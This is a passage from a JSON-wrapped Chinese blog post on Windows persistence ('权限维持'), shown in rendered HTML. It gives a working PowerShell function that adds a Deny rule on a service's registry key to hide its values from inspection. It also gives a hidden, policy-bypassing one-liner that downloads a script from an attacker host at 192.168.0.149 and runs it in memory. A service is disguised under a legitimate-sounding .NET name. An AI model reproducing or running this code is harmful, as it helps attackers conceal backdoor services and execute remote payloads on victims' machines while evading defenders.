data-src=\"https://zlte.netlify.app/imgs/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81_1.png\" alt=\"image\" /></p>\n<h2 id=\"5-但这样做有一个问题在注册表中很容易看到异常value\"><a class=\"anchor\" href=\"#5-但这样做有一个问题在注册表中很容易看到异常value\">#</a> 5. 但这样做有一个问题：在注册表中很容易看到异常 value。</h2>\n<p><img data-src=\"https://zlte.netlify.app/imgs/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81_2.png\" alt=\"image.png\" /></p>\n<h2 id=\"6-修改注册表acl\"><a class=\"anchor\" href=\"#6-修改注册表acl\">#</a> 6. 修改注册表 ACL</h2>\n<p><strong>我们可以通过修改注册表的 DACL 来拒绝对值的查询，达到隐藏异常值的效果。</strong><br />\n** 这里给出一个通过 powershell 修改注册表项的访问权限的简单脚本：   **</p>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> Server-Sddl-Change<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token namespace\">[CmdletBinding()]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">param</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token namespace\">[parameter(Mandatory=$false)]</span><span class=\"token namespace\">[String]</span><span class=\"token variable\">$Name</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$ROOT</span> = <span class=\"token string\">\"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$S</span> = <span class=\"token variable\">$ROOT</span><span class=\"token operator\">+</span><span class=\"token variable\">$NAME</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$acl</span> = <span class=\"token function\">Get-Acl</span> <span class=\"token variable\">$S</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$acl</span><span class=\"token punctuation\">.</span>SetAccessRuleProtection<span class=\"token punctuation\">(</span><span class=\"token boolean\">$true</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">$false</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$person</span> = <span class=\"token namespace\">[System.Security.Principal.NTAccount]</span><span class=\"token string\">\"Everyone\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$access</span> = <span class=\"token namespace\">[System.Security.AccessControl.RegistryRights]</span><span class=\"token string\">\"QueryValues\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$inheritance</span> = <span class=\"token namespace\">[System.Security.AccessControl.InheritanceFlags]</span><span class=\"token string\">\"None\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$propagation</span> = <span class=\"token namespace\">[System.Security.AccessControl.PropagationFlags]</span><span class=\"token string\">\"None\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$type</span> = <span class=\"token namespace\">[System.Security.AccessControl.AccessControlType]</span><span class=\"token string\">\"Deny\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$rule</span> = <span class=\"token function\">New-Object</span> System<span class=\"token punctuation\">.</span>Security<span class=\"token punctuation\">.</span>AccessControl<span class=\"token punctuation\">.</span>RegistryAccessRule<span class=\"token punctuation\">(</span> `</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$person</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$access</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$inheritance</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$propagation</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$type</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$acl</span><span class=\"token punctuation\">.</span>AddAccessRule<span class=\"token punctuation\">(</span><span class=\"token variable\">$rule</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$person</span> = <span class=\"token namespace\">[System.Security.Principal.NTAccount]</span><span class=\"token string\">\"Everyone\"</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$access</span> =</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token namespace\">[System.Security.AccessControl.RegistryRights]</span><span class=\"token string\">\"SetValue,CreateSubKey,EnumerateSu</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>bKeys,Notify,CreateLink,Delete,ReadPermissions,WriteKey,ExecuteKey,ReadKey,Chang</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ePermissions,TakeOwnership\"</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token variable\">$inheritance</span> = <span class=\"token namespace\">[System.Security.AccessControl.InheritanceFlags]</span><span class=\"token string\">\"None\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token variable\">$propagation</span> = <span class=\"token namespace\">[System.Security.AccessControl.PropagationFlags]</span><span class=\"token string\">\"None\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token variable\">$type</span> = <span class=\"token namespace\">[System.Security.AccessControl.AccessControlType]</span><span class=\"token string\">\"Allow\"</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$rule</span> = <span class=\"token function\">New-Object</span> System<span class=\"token punctuation\">.</span>Security<span class=\"token punctuation\">.</span>AccessControl<span class=\"token punctuation\">.</span>RegistryAccessRule<span class=\"token punctuation\">(</span> `</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$person</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$access</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$inheritance</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$propagation</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$type</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token variable\">$acl</span><span class=\"token punctuation\">.</span>AddAccessRule<span class=\"token punctuation\">(</span><span class=\"token variable\">$rule</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token function\">Set-Acl</span> <span class=\"token variable\">$S</span> <span class=\"token variable\">$acl</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"7-远程加载powershell脚本\"><a class=\"anchor\" href=\"#7-远程加载powershell脚本\">#</a> 7. 远程加载 powershell 脚本：</h2>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>powershell<span class=\"token punctuation\">.</span>exe <span class=\"token operator\">-</span>exec bypass <span class=\"token operator\">-</span>nop <span class=\"token operator\">-</span>w hidden <span class=\"token operator\">-</span>c \"<span class=\"token function\">IEX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">new-object</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>net<span class=\"token punctuation\">.</span>webclient<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>downloadstring<span class=\"token punctuation\">(</span><span class=\"token string\">'http://192.168.0.149/1.ps1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>Server-Sddl-Change <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Name <span class=\"token string\">'.NET CLR Networking 3.5.0.0'</span></pre></td></tr></table></figure><h2 id=\"8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏\"><a class=\"anchor\" href=\"#8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏\">#</a> 8. .NET CLR Networking 3.5.0.0 改成你的服务名 从下图可见已将值从该服务项中隐藏：</h2>\n<p><img data-src=\"https://zlte.netlify.app/imgs/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81_3.png\" alt=\"image.png\" /></p>\n",
            "tags": [
                "权限维持"
            ]
        }
    ]
}